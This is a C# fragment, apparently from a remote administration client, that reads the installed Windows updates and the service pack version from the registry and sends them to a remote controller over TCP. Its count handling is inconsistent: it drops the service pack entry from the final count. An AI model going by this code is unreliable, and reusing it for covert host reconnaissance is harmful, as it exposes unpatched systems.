            #region SendInstalledUpdatesList method

            List<string> list_AllUpdates = new List<string>();

            void CollectUpdates(RegistryKey registryKey_obj)
            {
                try
                {
                    for (int int_CycleCount = 0; int_CycleCount != registryKey_obj.SubKeyCount; int_CycleCount++)
                    {
                        foreach (string string_ValueName in registryKey_obj.OpenSubKey(registryKey_obj.GetSubKeyNames()[int_CycleCount]).GetValueNames())
                        {
                            if (string_ValueName == "Type" &&
                            (string)registryKey_obj.OpenSubKey(registryKey_obj.GetSubKeyNames()[int_CycleCount]).GetValue(string_ValueName) == "Update")
                            {
                                list_AllUpdates.Add(registryKey_obj.Name + "\\" + registryKey_obj.GetSubKeyNames()[int_CycleCount]);
                            }
                        }
                    }

                    foreach (string string_NewRegistryKey in registryKey_obj.GetSubKeyNames())
                    {
                        CollectUpdates(registryKey_obj.OpenSubKey(string_NewRegistryKey));
                    }

                    return;

                }
                catch (Exception)
                {

                }
            }


            public void SendInstalledUpdatesList()
            {
                this.list_AllUpdates.Clear();

                string string_CurrentKeyPath, string_UpdateDescription, string_InstallBy, string_InstallDate, string_SPVersion;

                RegistryKey registryKey_obj = Registry.LocalMachine.OpenSubKey("SOFTWARE").OpenSubKey("Microsoft").OpenSubKey("Updates");

                CollectUpdates(registryKey_obj);

                MemoryStream memoryStream_DataToSend = new MemoryStream();

                CommonMethods.WriteIntToStream(memoryStream_DataToSend, 31);

                int int_UpdatesCountStreamPosition = (int)memoryStream_DataToSend.Position;

                string_SPVersion = (string)Registry.LocalMachine.OpenSubKey("SOFTWARE").OpenSubKey("Microsoft").OpenSubKey("Windows NT").OpenSubKey("CurrentVersion").GetValue("CSDVersion");

                if (string_SPVersion != null)
                {
                    CommonMethods.WriteIntToStream(memoryStream_DataToSend, list_AllUpdates.Count + 1);

                    CommonMethods.WriteStringToStream(memoryStream_DataToSend, string_SPVersion);
                    CommonMethods.WriteStringToStream(memoryStream_DataToSend, "");
                    CommonMethods.WriteStringToStream(memoryStream_DataToSend, "");
                }

                else CommonMethods.WriteIntToStream(memoryStream_DataToSend, list_AllUpdates.Count);

                int int_ActuallyInstalled = list_AllUpdates.Count;

                for (int int_CycleCount = 0; int_CycleCount != list_AllUpdates.Count; int_CycleCount++)
                {
                    string_UpdateDescription = string_InstallBy = string_InstallDate = String.Empty;

                    string_CurrentKeyPath = ((string)list_AllUpdates[int_CycleCount]).Replace("HKEY_LOCAL_MACHINE\\", "");

                    registryKey_obj = Registry.LocalMachine.OpenSubKey(string_CurrentKeyPath);

                    foreach (string string_ValueName in registryKey_obj.GetValueNames())
                    {
                        switch (string_ValueName)
                        {
                            case "Description":
                                string_UpdateDescription = (string)registryKey_obj.GetValue(string_ValueName);
                                break;

                            case "InstalledBy":
                                string_InstallBy = (string)registryKey_obj.GetValue(string_ValueName);
                                break;

                            case "InstalledDate":
                                string_InstallDate = (string)registryKey_obj.GetValue(string_ValueName);
                                break;
                        }
                    }


                    if (string_UpdateDescription.Length == 0)
                    {
                        int_ActuallyInstalled--;

                        continue;
                    }

                    CommonMethods.WriteStringToStream(memoryStream_DataToSend, string_UpdateDescription);
                    CommonMethods.WriteStringToStream(memoryStream_DataToSend, string_InstallBy);
                    CommonMethods.WriteStringToStream(memoryStream_DataToSend, string_InstallDate);
                }

                memoryStream_DataToSend.SetLength(memoryStream_DataToSend.Position);

                memoryStream_DataToSend.Position = int_UpdatesCountStreamPosition;

                CommonMethods.WriteIntToStream(memoryStream_DataToSend, int_ActuallyInstalled);

                memoryStream_DataToSend.Position = memoryStream_DataToSend.Length;

                CurrentlyUsedTcpClient.SendData(memoryStream_DataToSend.ToArray(), SentDataType.ApplicationData);

                memoryStream_DataToSend.Close();

                list_AllUpdates.Clear();
            }

